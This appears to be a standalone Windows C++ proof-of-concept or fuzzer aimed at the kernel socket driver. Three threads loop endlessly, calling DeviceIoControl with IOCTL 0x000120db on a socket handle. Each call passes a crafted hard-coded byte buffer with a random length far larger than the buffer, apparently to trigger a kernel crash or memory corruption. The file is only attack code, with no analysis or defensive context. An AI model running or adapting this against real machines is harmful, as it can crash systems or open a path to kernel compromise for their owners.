#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <array>
#include <time.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Kernel32.lib")

DWORD CALLBACK threadProc(LPVOID)
{

    struct addrinfo* ressrc = NULL, * resdest = NULL, * resbind = NULL;/*RAW*/

    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }


    srand(time(NULL));
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = 0;
    hints.ai_flags = AI_PASSIVE;

    struct addrinfo* result = NULL;
    iResult = getaddrinfo(NULL, "1337", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    SOCKET ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    DWORD BytesReturned = 0;
    BOOL Status = 0;

    size_t Size = 0;



    BYTE InputBuffer[] = "\x03\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x16\xad\x95\xff\x01\x00\x00\xff\xff\xff\xff\xff\xff\xff\x02\x00\x01\xbb\x0d\x6b\x2a\x09\xde\x98\x77\x10\x00\x00\x00\x00\x00\x00\x00\x29\x40\x00\x00\x00\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x0d\x6b\x2a\x10\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x05\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x00\x00\x00\x00\x00\x00\x07\x21\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x00\x00\x00\x02\x00\x01\xbb\x0d\x6b\x2a\x10\x00\x00\x01\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x20\x05\x00\x01";

    Size = sizeof(InputBuffer);

    while (1)
    {
        Status = DeviceIoControl(
            (HANDLE)ListenSocket,
            0x000120db,
            InputBuffer,
            Size,
            InputBuffer,
            Size,
            &BytesReturned,
            NULL);

        Size = rand() % 0xFFFF;
    }

    
    




    return 0;

}

int main() 
{
    srand(time(NULL));


    HANDLE ghMutex = CreateMutex(
        NULL,              // default security attributes
        FALSE,             // initially not owned
        NULL);             // unnamed mutex

    if (ghMutex == NULL)
    {
        printf("CreateMutex error: %d\n", GetLastError());
        return 1;
    }

    const int NUMTHREADS = 3;
    HANDLE aThread[NUMTHREADS];
    DWORD threadID = 0;

    for (int i = 0; i < NUMTHREADS; i++)
    {
        aThread[i] = CreateThread(NULL, 0, threadProc, NULL, 0, &threadID);
    }

    WaitForMultipleObjects(NUMTHREADS, aThread, FALSE, 100000);

    for (int i = 0; i < NUMTHREADS; i++)
        CloseHandle(aThread[i]);

    return 0;
}